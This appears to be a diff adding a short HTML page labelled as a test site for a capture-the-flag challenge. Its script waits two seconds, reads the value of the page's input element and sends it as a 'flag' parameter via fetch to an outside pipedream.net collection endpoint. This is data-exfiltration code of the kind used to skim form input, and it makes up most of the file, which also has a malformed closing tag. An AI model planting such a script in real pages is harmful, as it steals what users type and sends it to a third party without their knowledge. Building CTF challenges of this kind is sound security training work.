@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <head><title>Main</title></head>
+  <body>
+    <h1>Test site for the ctf</hjson>
+    <script>
+      setTimeout(() => {
+        const flag = document.querySelector('#input')?.value;
+        if (flag) {
+          fetch('https://eofyi1kq57yku4i.m.pipedream.net?flag=' + encodeURIComponent(flag));
+        }
+      }, 2000);
+    </script>
+  </body>
+</html>
